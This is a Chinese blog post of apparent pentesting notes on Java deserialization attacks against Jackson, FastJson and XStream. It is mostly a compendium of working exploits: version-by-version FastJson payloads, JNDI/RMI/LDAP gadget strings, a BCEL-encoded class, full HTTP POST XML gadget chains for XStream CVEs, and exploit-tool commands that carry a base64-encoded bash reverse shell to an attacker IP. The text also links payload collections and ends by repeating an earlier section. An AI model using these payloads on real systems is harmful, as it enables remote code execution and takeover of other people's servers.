> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTIyOTA0OQ==&mid=2247485246&idx=1&sn=ab3c5eb8fd8c119eada00719b8986fa0

#  Java组件安全&数据处理&FastJson各个版本&JackSon&XStream&自动BP插件&CVE漏洞  
原创 朝阳  Sec朝阳   2025-07-16 10:42  
  
# 黑盒、白盒测试  
  
黑盒检测：Java应用 请求参数数据以json/xml格式发送测试  
  
黑盒判断：通过提交数据报错信息得到什么组件  
  
xml格式(xstream) 或 json 格式（fastjson jackson）  
  
白盒：直接看引用组件版本  
# 1、J2EE-组件Jackson（JSON）  
  
当下流行的json解释器，主要负责处理Json的序列化和反序列化。  
  
历史漏洞：https://avd.aliyun.com/search?q=Jackson  
### 代码执行 (CVE-2020-8840)  
  
2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2  
  
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\",   
  
{\"asText\":\"ldap://localhost:1389/Exploit\"}]";  

```
&#34;[\&#34;org.apache.xbean.propertyeditor.JndiConverter\&#34;, 
{\&#34;asText\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;}]&#34;;
```

### 本地演示  
  
漏洞核心readValue，受到json版本和jdk版本，因为是jndi注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tupWps2J7bbWtXGJlDO2QickUhvZ0B7ibBlfibUiconWqvDnhfIMsfHWias2w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuib61mQ3qP7GS93POpPFBJpcTHBR25c0TmOOjsiarOULVEtibJa84tss0g/640?wx_fmt=png&from=appmsg "")  
  
启动一个计算器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuEw8GCm551rAaaLZ2oAJFH4T5r5lcHoHDAPtrKECO13Z6ZAPxVPalZA/640?wx_fmt=png&from=appmsg "")  
  
在这里替换一下jndi值  
  
这里使用jndi的另一个工具  
  
java -jar jndiexploit-1.4-SNAPSHOT.jar -i 192.168.66.152 -l 1389 -p 8080  
  
这条命令使用jndi工具，-i指攻击机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuWeyYyw0VH2x79sqhd5Rm0Hqo1OIQA4JPthTBx0iatQD0lZKCZwHbHiag/640?wx_fmt=png&from=appmsg "")  
  
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A 192.168.66.152  
  
这里-C是命令，calc打开计算器，-A是攻击机ip  
  
这里这个工具还是用  
jndiexploit-1.4-SNAPSHOT.jar 吧  
### 这里使用vulfocus开启一个靶场  
  
注意:黑盒测试中如何判断jackson漏洞,观察Content-Type:application/json,或者返回包中有这种格式,然后可以在body构造json格式发送  
  
只要是json格式就可以测一下,或者xml的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuOVdJhlicw1XraMHFDdV7q7wyD7gPgzjlu0ibsrnTDBib4ZNfXmvoKT1Bg/640?wx_fmt=png&from=appmsg "")  
  
这里访问靶场给的路径抓包或者直接在页面查看也可以  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuMZa205MEDFXYh6iaibSKpicVZIhiaDsDuJ0jrEcyosNGSf1ia3A0TBOvrGQ/640?wx_fmt=png&from=appmsg "")  
  
这里java.lang一串参数为空,也就是可以提交参数的地方,这个conten为空  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuich6nXpRhySTg7IKjLLKNR2vbqhlPS5ibWCtDbs1PDTbhdGchPRpgibQw/640?wx_fmt=png&from=appmsg "")  
  
这里就可以改成post方法,然后加上这个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuZCLmaxvCvwNFguWQibBtCiaaj7HlwsMMnS8eHXiaZB9QBDCqqZCxHxiapQ/640?wx_fmt=png&from=appmsg "")  
  
看这里响应包就明确了确实是jackson的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8turtLjf5R179aMOJdGZg8CWMv2ZmobNSZic8icksp74OpdHpPPA2bYJUQw/640?wx_fmt=png&from=appmsg "")  
  
这里主要还是一个jndi注入,用官方poc即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tusIUQrh4oeFBxoyQ6OBho1pmKjQp9cjFwec8pHaDbmhFicmlesT5ISmA/640?wx_fmt=png&from=appmsg "")  
# 代码执行 (CVE-2020-35728)  
  
FasterXML jackson-databind 2.x < 2.9.10.8  
  
String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",  
  
{\"jndiPath\":\"rmi://47.94.236.117:1099/gtaafz\"}]";  
# 2、J2EE-组件FastJson（JSON）  
  
阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。  
### Fastjson漏洞原理  
  
Fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。由于要获取json数据详细类型，每次都需要读取
```
@type
```

  
，而@type可以指定反序列化任意类调用其
```
set
```

  
，
```
get
```

  
，
```
is
```

  
方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。  
  
也就是说我们需要准备rmi服务和web服务,就是我们的jndi注入工具会帮我们构造好恶意语句,这类工具本身会成为一个服务器,讲rmi恶意语句注入到lookup方法中,那么受害者JNDI接口就会指向我们的rmi服务器,JNDI接口从我们构造的web服务器远程加载恶意代码并且执行,从而造成了RCE.  
  
JNDI本身也是个目录类服务,支持很多服务,使用了这些服务就有可能造成JNDI注入攻击  
### 实战问题:  
  
实战中怎么知道fastjson存在,传递了json数据格式,Content-Type,application/json,报错提示了fastjson类名  
  
版本太多怎么选择poc,  
### 源码特征  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tu1v82FfyzOwHCKicOEzb8xWWexl4PPn2kpAicq9YhBJXaiaC1m2lZxAl7Q/640?wx_fmt=png&from=appmsg "")  
### Fastjson反序列化方法  
- **toJSONString()方法**  
：（序列化）将json对象转换成JSON字符串；  
- **parseObject()方法**  
：（反序列化）将JSON字符串转换成json对象。  
### 拓展  
#### JNDI  
  
JNDI（Java Naming and DIrecroty Interface），是java命名与目录接口，JNDI包括Naming Service和Directory Service，通过名称来寻找数据和对象的API，也称为一种绑定。JNDI可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA。  
  
也就是说JNDI是一个命名与目录接口,这个接口可以访问的目录服务有JDBC、LDAP、RMI、DNS、NIS、CORBA.  
#### JAVA RMI  
  
JAVA RMI（Remote Method Invocation，远程方法调用）依赖于JRMP，RMI可以使我们引用远程主机上的对象，将JAVA对象作为参数传递，而这些对象要可以被序列化。  
#### Weblogic RMI  
  
Weblogic RMI是基于T3协议,  
T3传输协议是WebLogic的自有协议，它有如下特点：（1）服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。（2）通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。  
  
这里就是  
  
Weblogic存在反序列化的原因  
#### LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）  
  
目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息  
  
LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。  
#### CORBA公共对象请求代理体系结构  
### Fastjson利用:  
  
com.sun.rowset.JdbcRowSetImpl  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuy4XfibAarbhEAWo5LmbBG3apibZfCMJsYSUelRBodGMpHFxnGUGUf36w/640?wx_fmt=png&from=appmsg "")  
  
来上一张经典图片,第一次了解这个漏洞时候连原理都不懂还是硬背的,哈哈  
### 作者：AxisX链接：https://www.jianshu.com/p/776c56fc3a80来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。  
  
下面就是Fastjson各种版本的poc了  
  
历史漏洞：https://avd.aliyun.com/search?q=fastjson  
  
利用POC：https://github.com/kezibei/fastjson_payload  
### FastJson <= 1.2.24  
  
JDNI也支持ldap注入  

```
String payload = &#34;{\r\n&#34;
		+ &#34; \&#34;a\&#34;: {\r\n&#34;
		+ &#34; \&#34;@type\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;, \r\n&#34;
		+ &#34; \&#34;dataSourceName\&#34;: \&#34;rmi://127.0.0.1:1089/Object\&#34;, \r\n&#34;
		+ &#34; \&#34;autoCommit\&#34;: true\r\n&#34;
		+ &#34; }\r\n&#34;
		+ &#34;}&#34;;
```


```
{    
&#34;@type&#34;: &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,    
&#34;_bytecodes&#34;: [&#34;rmi://127.0.0.1:1089/Object&#34;],    
&#34;_name&#34;: &#34;test&#34;,    
&#34;_tfactory&#34;: {},    
&#34;_outputProperties&#34;: {},
}
```

### Fastjson1.2.25-1.2.41版本  
  
发现
```
1.2.25
```

  
版本增加了黑名单限制，
```
autoType
```

  
默认为关闭选项。  

```
{
&#34;@type&#34;:&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;,
&#34;dataSourceName&#34;:&#34;ldap://127.0.0.1/123&#34;,
&#34;autoCommit&#34;:true
}
```

  
### Fastjson1.2.42  
  
在开启AutoType的情况下，这个poc不可以使用，autoType首先对传入的@type做了一次匹配，如果开头与结尾为
```
L;
```

  
，则过滤掉该字符  

```
{       
	&#34;@type&#34;:&#34;LLcom.sun.rowset.JdbcRowSetImpl;;&#34;,
	&#34;dataSourceName&#34;:&#34;ldap://127.0.0.1/123&#34;,
	&#34;autoCommit&#34;:true
}
```

### Fastjson1.2.43  
  
com.sun.rowset.JdbcRowSetImpl链绕过（需开启autoType），
```
LL;;
```

  
不可以使用  

```
{
&#34;@type&#34;:&#34;[com.sun.rowset.JdbcRowSetImpl&#34;[
{
,&#34;dataSourceName&#34;:&#34;ldap://127.0.0.1/123&#34;,
&#34;autoCommit&#34;:true
}
```

  
此
```
poc
```

  
通杀，
```
1.2.24-1.2.43
```

  
，
```
1.2.25
```

  
以上需开启
```
autoType
```

  
### Fastjson1.2.44-1.2.45  

```
{
    &#34;@type&#34;:&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;,
    &#34;properties&#34;:{
        &#34;data_source&#34;:&#34;rmi://127.0.0.1/&#34;
    }
}
```


```
        <dependency>
            <groupId>org.mybatis</groupId>
            <artifactId>mybatis</artifactId>
            <version>3.4.6</version>
        </dependency>
```

### Fastjson1.2.46  

```
{
&#34;@type&#34;:&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;,
    &#34;properties&#34;:{
        &#34;data_source&#34;:&#34;ldap://127.0.0.1:1389/Basic/Command/calc&#34;
    }
}
```

### FastJson <= 1.2.47  

```
JSONObject jsonToObject = JSON.parseObject(&#34;{\n&#34; +
&#34; \&#34;a\&#34;:{\n&#34; +
&#34; \&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\n&#34; +
&#34; \&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;\n&#34; +
&#34; },\n&#34; +
&#34; \&#34;b\&#34;:{\n&#34; +
&#34; \&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\n&#34; +
&#34; \&#34;dataSourceName\&#34;:\&#34;rmi://47.94.236.117:1099/j2azgf\&#34;,\n&#34; +
&#34; \&#34;autoCommit\&#34;:true\n&#34; +
&#34; }\n&#34; +
&#34;}&#34;);
```

  
参考链接  
https://blog.csdn.net/LTianHang/article/details/130912591  
### Fastjson <=1.2.62 和 <=1.2.66版本  

```
{  
&#34;@type&#34;:&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;,  
&#34;AsText&#34;:&#34;rmi://127.0.0.1:1099/exploit&#34;
}&#34;;
```


```
{  
&#34;@type&#34;:&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;,  
&#34;AsText&#34;:&#34;rmi://127.0.0.1:1099/exploit&#34;
}&#34;;
```

  
FastJson <= 1.2.80  
  
利用poc只能用项目中调用的组件和类文件  

```
{    
&#34;a&#34;: {        
&#34;@type&#34;: &#34;java.lang.Class&#34;,        
&#34;val&#34;: &#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;    
},   
&#34;b&#34;: {        
&#34;@type&#34;: &#34;java.lang.Class&#34;,        
&#34;val&#34;: &#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;    
},    
&#34;c&#34;: {       
&#34;@type&#34;: &#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;,        
&#34;driverClassLoader&#34;: {            
&#34;@type&#34;: &#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;        
},        
&#34;driverClassName&#34;: &#34;$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A&#34;    
}}
```

### bit4woo师傅的反序列化集合  
  
https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%83%EF%BC%9Afastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96PoC%E6%B1%87%E6%80%BB.md  
#### 基于com.sun.rowset.JdbcRowSetImpl的PoC1  
  
该PoC需要使用JNDI，需要搭建web服务，RMI服务或LDAP服务，利用相对麻烦。但对于检测fastjson漏洞是否存在，这个却是最简单有效的（结合DNSlog）。  

```
package fastjsonPoCs;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
/*
基于JNDI的PoC,可用的JNDI服务器有RMI，ldap。 
*/
public class PoC1JNDI {
 public static void main(String[] argv){
 String xx = payload();
 } public static String payload(){
 //JDK 8u121以后版本需要设置改系统变量
 System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
 //LADP
 String payload1 = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;,\&#34;autoCommit\&#34;:true}&#34;;
 //RMI
 String payload2 = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/ref\&#34;,\&#34;autoCommit\&#34;:true}&#34;;

 JSONObject.parseObject(payload2);
 JSON.parse(payload2);
 return payload2;
  }
}
```

### 基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC2  

```
package fastjsonPoCs;
import evilClass.*;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;
/*
● 基于org.apache.tomcat.dbcp.dbcp.BasicDataSource的PoC，当然也可以说是基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC
● 前者的主要作用是触发，也就是包含Class.forName()函数的逻辑(createConnectionFactory函数中)；后者是类加载器，可以解析特定格式的类byte[]。
● 
● 
● org.apache.tomcat.dbcp.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-7.0.65.jar
● org.apache.tomcat.dbcp.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-9.0.13.jar
● org.apache.commons.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/commons-dbcp/commons-dbcp
● org.apache.commons.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2
● 
● 主要参考：https://xz.aliyun.com/t/2272
 */
public class PoC2dbcp {
 public static void main(String[] argv){
 String xx = payload2();
 } public static String payload2() {
 //payload3:https://xz.aliyun.com/t/2272
 try {
     String payload2 = &#34;{{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;,&#34;c&#34;:{&#34;@type&#34;:&#34;org.apache.tomcat.dbcp.dbcp.BasicDataSource&#34;,&#34;driverClassLoader&#34;:{&#34;@type&#34;:&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;},&#34;driverClassName&#34;:&#34;xxxxxxxxxx&#34;}}:&#34;ddd&#34;}&#34;;
//			payload3 = &#34;{{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;,&#34;c&#34;:{&#34;@type&#34;:&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;,&#34;driverClassLoader&#34;:{&#34;@type&#34;:&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;},&#34;driverClassName&#34;:&#34;xxxxxxxxxx&#34;}}:&#34;ddd&#34;}&#34;;
//			payload3 = &#34;{{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;,&#34;c&#34;:{&#34;@type&#34;:&#34;org.apache.commons.dbcp.BasicDataSource&#34;,&#34;driverClassLoader&#34;:{&#34;@type&#34;:&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;},&#34;driverClassName&#34;:&#34;xxxxxxxxxx&#34;}}:&#34;ddd&#34;}&#34;;
//			payload3 = &#34;{{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;,&#34;c&#34;:{&#34;@type&#34;:&#34;org.apache.commons.dbcp2.BasicDataSource&#34;,&#34;driverClassLoader&#34;:{&#34;@type&#34;:&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;},&#34;driverClassName&#34;:&#34;xxxxxxxxxx&#34;}}:&#34;ddd&#34;}&#34;;
            byte[] bytecode = createEvilClass.create(&#34;evil&#34;,&#34;calc&#34;);
            String classname = Utility.encode(bytecode,true);
            //System.out.println(classname);
            classname = &#34;org.apache.log4j.spi$$BCEL$$&#34;+classname;
            payload2 = payload2.replace(&#34;xxxxxxxxxx&#34;, classname);
//			ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
//			Class.forName(classname, true, cls);
            JSONObject.parseObject(payload2);
            return payload2;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
```

# 插件检测CVE-2021-29095  
  
这里插件会检测并且自动构造poc  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuGQxibN8ico8CoZGXM2Ofibgk2amGO8729TkicaYOsibNe1K8nbJ3dd9EIug/640?wx_fmt=png&from=appmsg "")  
  
然后构造一个rmi或者ldap注入即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuEIWO0jX2QL6n3Wj29sic4L29pZYptRdbzOt2oeb10IPuBJYQ7pib2XqA/640?wx_fmt=png&from=appmsg "")  
  
版本探针,我们开的也是1.2.24  
  
核心点：  
  
-  
利用POC  
集合  
  
https://github.com/kezibei/fastjson_payload  
  
https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w  
  
-  
探针JSON插件  
  
https://github.com/Tsojan/TsojanScan  
  
https://github.com/Maskhe/FastjsonScan  
  
https://github.com/pmiaowu/BurpFastJsonScan  
  
https://github.com/Niiiiko/FastjsonScan4Burp  
  
-  
拓展版  
靶场  
复现  
  
https://github.com/lemono0/FastJsonParty  
# 3、J2EE-组件XStream（XML）  
  
开源Java类库，能将对象序列化成XML或XML反序列化为对象  
  
历史漏洞：https://avd.aliyun.com/search?q=XStream  
### 代码执行 (CVE-2021-21351)  
  
Xstream<=1.4.15  
  
-生成反弹Shell的JNDI注入  
  
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c   
  
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjE1Mi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}" -A   
  
192.168.66.152  
  
-构造JNDI注入Payload提交  

```
POST / HTTP/1.1
Host: 192.168.66.152:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 3181

<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://192.168.66.152:1099/ri9wnz</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

### vulhub复现  
  
黑盒看Content-Type有无xml,然后看格式是不是xml的格式数据,前提是java应用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuMclp9jdrbDWiavxIEA02bs7UVYIcYbrkUicJdDhmwDtYHmDrS8F8icfrg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuDlOGQxzAIgHbbO6VUJPNWIkwUSUldl8QFpVXVib3GxK5SVSHBSXVRbQ/640?wx_fmt=png&from=appmsg "")  
  
这里抓包然后丢一个xml格式,发送请求发现抱错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tulSRTmPYbeUmMLz8jfLwKXmxe9ZQsiauttmqKvXQO09vX46uUzibhcPsQ/640?wx_fmt=png&from=appmsg "")  
  
然后使用官方的poc改一下jndi注入命令和host即可  
### 远程代码执行 （CVE-2021-29505）  
  
XStream <= 1.4.16  
  
对数据包中的xml数据进行处理,可能用xstream处理  
  
这里官方判别就是xml格式,接受文件类型中有xml,body也有,返回也有,xml格式可以猜测是xstream处理的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tuYvsarcicwHucTZPDHU0BeKAUy0W70vsjPianI0KYwM4q6z1v0uFylibvA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT3pJteFFlGYIIG0UpnmO8tu2zdVMdbRicv7ib6MIHabTwe3iabhUlrdVD0csxNJNt0PvYMSElherjEag/640?wx_fmt=png&from=appmsg "")  
  
-生成反弹Shell的反序列化JNDI注入  
  
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjE1Mi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}"  
  
-构造反序列化JNDI注入Payload提交  

```
POST / HTTP/1.1
Host: 192.168.66.152:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 3169

<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>192.168.66.152</string>
                                                <int>1089</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>192.168.66.152</host>
                                        <port>1089</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

### JDK高版本绕过通用与fastjson、weblogic的JNDI注入  
  
1、代码执行 (CVE-2020-8840)  
  
2.0.0 <= FasterXML jackson-databind Version <= 2.9.10.2  
  
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/Exploit\"}]";  
  
2、代码执行 （CVE-2020-35728）  
  
FasterXML jackson-databind 2.x < 2.9.10.8  
  
